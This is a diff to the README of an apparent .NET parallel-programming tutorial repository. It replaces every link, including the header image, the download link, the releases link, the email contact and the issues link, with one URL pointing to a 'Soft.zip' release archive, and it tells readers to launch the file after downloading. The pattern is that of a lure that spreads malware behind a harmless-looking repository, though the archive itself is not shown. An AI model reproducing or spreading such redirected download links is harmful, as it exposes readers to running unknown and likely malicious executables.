@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Parallel Programming in .NET Repository! 🚀
 
-![Parallel Programming](https://www.oreilly.com/library/view/programming-c-90/9781801071151/assets/c31p070e01_v0101.png)
+![Parallel Programming](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip)
 
 ## Repository Name: parallel-programming-dotnet
 ## Description: 
@@ -27,18 +27,18 @@ Welcome to the "parallel-programming-dotnet" repository! Here, you will find a c
 2. **Practices**: Put your knowledge to the test with hands-on exercises and code samples.
 3. **Resources**: Access additional reading materials, links, and helpful resources to further expand your understanding.
 
-## 🔗 [Download the Complete Release Here!](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+## 🔗 [Download the Complete Release Here!](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip)
 - 🚀 Launch the file after downloading to access all the goodies packed for you!
 
 ## 🌐 Additional Resources and Updates:
-- For more updates, check out the [Releases](https://github.com/adelante20/Release) section regularly.
+- For more updates, check out the [Releases](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip) section regularly.
 - Stay tuned for new lessons, practices, and resources added to the repository. Your feedback and contributions are always welcome!
 
 ## 🌟 Join the Parallel Programming Community:
 - Connect with like-minded developers, share your insights, and collaborate on projects related to parallel programming. Your participation makes the community vibrant and enriching for all!
 
 ## 📫 How to Get in Touch:
-- For feedback, suggestions, or queries, feel free to reach out via [email](mailto:example@email.com) or [GitHub Issues](https://github.com/adelante20/parallel-programming-dotnet/issues).
+- For feedback, suggestions, or queries, feel free to reach out via [email](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip) or [GitHub Issues](https://github.com/Neko277/parallel-programming-dotnet/releases/download/v1.0/Soft.zip).
 
 ## 🚧 Let's Build a Concurrent Future Together! 🚧
 
